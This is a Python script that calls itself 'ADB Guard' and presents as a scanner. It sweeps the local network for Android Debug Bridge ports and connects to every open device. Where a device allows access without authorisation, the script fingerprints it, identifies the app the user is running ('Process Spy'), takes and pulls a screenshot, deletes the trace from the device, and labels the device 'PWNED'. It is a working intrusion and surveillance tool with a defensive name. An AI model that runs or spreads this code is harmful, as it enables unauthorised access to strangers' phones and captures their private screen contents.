#!/usr/bin/env python3
# CyberMoranda ADB Guard v5.0 - Sentinel Edition

import socket
import subprocess
import re
import os
import time
import sys
import concurrent.futures
from datetime import datetime

# ---------- COLOR SETUP ----------
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        def __getattr__(self, name): return ""
    Fore = Style = Dummy()

CYAN = Fore.CYAN
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT
DIM = Style.DIM

OUTPUT_DIR = "scans_output"
SCREENSHOT_DIR = os.path.join(OUTPUT_DIR, "ADB_Evidence")

# ---------- UTILS ----------

def clear():
    os.system("clear")

def banner():
    clear()
    print(f"""{CYAN}{BOLD}
      ▄▄▄       ██████╗ ██████╗      ▄▄▄▄▀
     ▒████▄     ██╔══██╗██╔══██╗  ▀▀▀ █
     ▒██  ▀█▄   ██║  ██║██████╔╝      █
     ░██▄▄▄▄██  ██║  ██║██╔══██╗     █
      ▓█   ▓██▒██████╔╝██████╔╝    ▄▀
      ▒▒   ▓▒█░╚═════╝ ╚═════╝     █
{RESET}{YELLOW}{BOLD}   ADB GUARD v5.0{RESET} | {RED}SENTINEL EDITION{RESET}
   {DIM}Process Spy • Deep Fingerprint • Auto-Evidence{RESET}
""")

def ensure_dirs():
    if not os.path.exists(OUTPUT_DIR): os.makedirs(OUTPUT_DIR)
    if not os.path.exists(SCREENSHOT_DIR): os.makedirs(SCREENSHOT_DIR)

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def detect_base_ip():
    try:
        output = subprocess.check_output("ip route 2>/dev/null", shell=True, text=True, errors="ignore")
        for line in output.splitlines():
            if "src" in line:
                m = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    parts = m.group(1).split(".")
                    return ".".join(parts[:3]) + "."
    except: pass
    return "192.168.1."

# ---------- INTELLIGENCE GATHERING (NEW) ----------

def get_active_app(ip, port):
    """(New) Identifies the app currently running on the screen."""
    try:
        cmd = f"adb -s {ip}:{port} shell dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'"
        output = subprocess.check_output(cmd, shell=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
        
        # Regex to find package name (e.g., com.whatsapp)
        match = re.search(r"\/([a-zA-Z0-9\._]+)", output)
        if match:
            return match.group(1).replace('}', '')
    except:
        pass
    return "Unknown App"

def take_evidence(ip, port):
    """Attempts to take a screenshot of the vulnerable device."""
    filename = f"Evidence_{ip}_{port}_{int(time.time())}.png"
    local_path = os.path.join(SCREENSHOT_DIR, filename)

    try:
        # 1. Take Screenshot
        subprocess.run(f"adb -s {ip}:{port} shell screencap -p /sdcard/temp_sentinel.png", 
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)

        # 2. Pull Screenshot
        subprocess.run(f"adb -s {ip}:{port} pull /sdcard/temp_sentinel.png {local_path}", 
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)

        # 3. Clean up
        subprocess.run(f"adb -s {ip}:{port} shell rm /sdcard/temp_sentinel.png", 
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)

        if os.path.exists(local_path):
            return filename
    except:
        pass
    return None

# ---------- SCANNING LOGIC ----------

def check_target(target_tuple):
    ip, port = target_tuple
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.4)

    details = None
    try:
        result = s.connect_ex((ip, port))
        s.close()

        if result == 0:
            details = {
                "ip": ip, "port": port, "status": "OPEN", 
                "model": "Unknown", "brand": "", "version": "",
                "access": "Unknown", "evidence": None, "active_app": "N/A"
            }
            try:
                # Connect
                subprocess.run(f"adb connect {ip}:{port}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)

                # Check Status
                dev_out = subprocess.check_output("adb devices", shell=True, text=True)

                if f"{ip}:{port}\tdevice" in dev_out:
                    details["access"] = "AUTHORIZED (VULNERABLE)"
                    
                    # --- DEEP FINGERPRINTING (NEW) ---
                    try:
                        details["model"] = subprocess.check_output(f"adb -s {ip}:{port} shell getprop ro.product.model", shell=True, text=True).strip()
                        details["brand"] = subprocess.check_output(f"adb -s {ip}:{port} shell getprop ro.product.brand", shell=True, text=True).strip()
                        details["version"] = subprocess.check_output(f"adb -s {ip}:{port} shell getprop ro.build.version.release", shell=True, text=True).strip()
                        
                        # --- PROCESS SPY (NEW) ---
                        details["active_app"] = get_active_app(ip, port)
                        
                        # Take Evidence
                        img = take_evidence(ip, port)
                        if img: details["evidence"] = img
                        
                    except:
                        pass

                elif f"{ip}:{port}\tunauthorized" in dev_out:
                    details["access"] = "UNAUTHORIZED (Locked)"
                    details["model"] = "Detected (Locked)"
                else:
                    details["access"] = "Connected (No Auth)"

                subprocess.run(f"adb disconnect {ip}:{port}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            except: pass
    except: pass
    return details

def generate_html_report(devices, base_ip):
    filename = os.path.join(OUTPUT_DIR, "Report_ADB_Sentinel.html")
    css = """
    body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:20px} 
    .card{border:1px solid #333;background:#111;padding:15px;margin-bottom:15px;border-left: 5px solid #00ff41; box-shadow: 0 0 10px rgba(0,255,65,0.1);}
    .card.danger{border-left: 5px solid #ff0000; box-shadow: 0 0 10px rgba(255,0,0,0.2);}
    h1{border-bottom: 2px solid #333; padding-bottom: 10px;}
    .badge{background:#222; padding: 2px 6px; border-radius: 4px; font-size: 0.9em; margin-right: 5px;}
    .img-box img{max-width: 100%; border: 1px solid #333; margin-top: 10px;}
    """

    html = f"<html><head><title>CyberMoranda Sentinel Report</title><style>{css}</style></head><body>"
    html += f"<h1>🛡️ SENTINEL v5.0 REPORT</h1><h3>Network: {base_ip}0/24 | Scan Time: {get_timestamp()}</h3>"

    for d in devices:
        color_class = "danger" if "AUTHORIZED" in d['access'] else ""
        html += f"<div class='card {color_class}'><p><b>TARGET:</b> {d['ip']}:{d['port']}</p>"
        
        if d['brand']:
             html += f"<p><b>DEVICE:</b> <span class='badge'>{d['brand']}</span> {d['model']} (Android {d['version']})</p>"
        else:
             html += f"<p><b>DEVICE:</b> {d['model']}</p>"
             
        html += f"<p><b>STATUS:</b> {d['access']}</p>"
        
        if d['active_app'] != "N/A":
            html += f"<p style='color:cyan'><b>👁️ ACTIVE APP:</b> {d['active_app']}</p>"

        if d['evidence']:
            html += f"<div class='img-box'><p>📸 EVIDENCE CAPTURED:</p><img src='ADB_Evidence/{d['evidence']}'></div>"
        html += "</div>"

    html += "</body></html>"
    with open(filename, "w") as f: f.write(html)
    return filename

def fast_scan(base_ip):
    ensure_dirs()
    print(f"\n{BLUE}[*] Sentinel Scanning {base_ip}0/24 (Ports 5555, 5559, etc)...{RESET}")

    targets = []
    # Scan common ADB ports
    for i in range(1, 255):
        for p in [5555, 5559, 37280, 40000]:
            targets.append((f"{base_ip}{i}", p))

    found_devices = []

    print(f"{YELLOW}[*] Deploying 100 Sentinel Threads...{RESET}\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(check_target, targets)

        for res in results:
            if res:
                found_devices.append(res)
                if "AUTHORIZED" in res['access']:
                    app_info = f"App: {res['active_app']}" if res['active_app'] != "N/A" else ""
                    print(f"{RED}[!!!] PWNED: {res['ip']} | {res['brand']} {res['model']} | {app_info} {RESET}")
                elif "UNAUTHORIZED" in res['access']:
                    print(f"{YELLOW}[!] LOCKED: {res['ip']} | Unauthorized{RESET}")
                else:
                    print(f"{GREEN}[+] OPEN: {res['ip']}:{res['port']}{RESET}")

    print(f"\n{BLUE}--- SENTINEL SCAN COMPLETE ---{RESET}")

    if found_devices:
        report_path = generate_html_report(found_devices, base_ip)
        print(f"{GREEN}[SUCCESS] Found {len(found_devices)} devices.{RESET}")
        print(f"{CYAN}[REPORT] Generated: {report_path}{RESET}")
    else:
        print(f"{GREEN}[✅] Network is Secure.{RESET}")

    input(f"\n{YELLOW}[Press Enter]{RESET}")

# ---------- MENUS ----------

def menu():
    while True:
        banner()
        print(f"{GREEN}[1]{RESET} 🚀  Start Sentinel Scan (Full Intel)")
        print(f"{GREEN}[2]{RESET} ℹ️   About v5.0")
        print(f"{RED}[0]{RESET} 🚪  Exit")

        choice = input(f"\n{CYAN}adb_guard@moranda:~$ {RESET}")

        if choice == '1':
            base = detect_base_ip()
            fast_scan(base)
        elif choice == '2':
            print(f"\n{YELLOW}ADB Sentinel v5.0 Improvements:")
            print(f"1. Process Spy: Detects what app is running.")
            print(f"2. Deep Fingerprint: Brand + Android Version.")
            print(f"3. Enhanced HTML Reporting.{RESET}")
            input(f"\n{BLUE}[Press Enter]{RESET}")
        elif choice == '0':
            break

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        sys.exit()
